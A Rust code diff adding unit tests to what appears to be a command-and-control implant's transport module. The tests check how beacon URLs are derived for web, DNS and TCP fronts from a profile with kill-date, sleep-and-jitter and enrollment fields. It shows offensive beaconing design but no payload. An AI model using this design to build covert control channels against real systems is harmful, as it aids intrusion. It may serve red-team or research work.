@@ -185,3 +185,70 @@ pub fn carriage_for(profile: &Profile) -> Box<dyn Contact> {
         _ => Box::new(http::Poll::new(profile)),
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn profile() -> Profile {
+        Profile {
+            enroll_url: "https://front.example".into(),
+            beacon_url: String::new(),
+            fallback_enroll_urls: Vec::new(),
+            ca_pem: String::new(),
+            kill_date: None,
+            sleep_seconds: 30.0,
+            jitter_seconds: 10.0,
+            mode: "poll".into(),
+            enroll_path: "/implants/enroll".into(),
+            request_timeout_seconds: 30.0,
+            envelope: "aesgcm".into(),
+            contact_envelope: "none".into(),
+            envelope_key: String::new(),
+            token: String::new(),
+            verbs: Vec::new(),
+        }
+    }
+
+    #[test]
+    fn beacon_urls_derive_the_fixed_route() {
+        assert_eq!(
+            beacon_url("https://front.example/shape"),
+            "https://front.example/implants/beacon"
+        );
+        assert_eq!(
+            beacon_url("tcp://host:443/ignored"),
+            "tcp://host:443/implants/beacon"
+        );
+        assert_eq!(beacon_url("bare.host"), "https://bare.host/implants/beacon");
+    }
+
+    #[test]
+    fn dialed_fronts_carry_the_non_web_families_dial_data() {
+        // The DNS zone is dial data, not a route: whichever front carries
+        // it wins, and the web derivation never touches it.
+        let mut dns = profile();
+        dns.beacon_url = "dns://resolver.example/zone.example".into();
+        assert_eq!(
+            dialed_beacon_url(&dns),
+            "dns://resolver.example/zone.example"
+        );
+        let mut tcp = profile();
+        tcp.enroll_url = "tcp://10.0.0.9:8443/anything".into();
+        assert_eq!(dialed_beacon_url(&tcp), "tcp://10.0.0.9:8443");
+        // The web families: the route derived off the front that answered,
+        // or the baked split front with the route appended.
+        let mut web = profile();
+        web.enroll_url = "https://front.example/enroll".into();
+        assert_eq!(
+            dialed_beacon_url(&web),
+            "https://front.example/implants/beacon"
+        );
+        let mut split = profile();
+        split.beacon_url = "https://beacon.example".into();
+        assert_eq!(
+            dialed_beacon_url(&split),
+            "https://beacon.example/implants/beacon"
+        );
+    }
+}
